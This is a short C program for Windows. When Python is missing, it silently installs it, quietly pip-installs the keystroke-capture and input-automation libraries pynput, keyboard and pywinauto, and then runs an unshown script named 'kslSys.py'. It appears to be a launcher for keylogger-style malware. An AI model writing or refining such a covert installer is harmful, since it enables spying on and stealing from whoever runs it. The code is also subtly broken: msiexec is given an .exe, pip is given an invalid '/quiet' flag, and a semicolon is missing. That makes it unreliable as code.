#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

int main()
{
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Python\\PythonCore", 0, KEY_READ, &hKey);

    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
    } else {
        system("msiexec /i python-3.10.11-amd64.exe /quiet");
        system("py -m pip install requests pywinauto pynput keyboard /quiet")
    }
    system("py kslSys.py");

    return 0;
}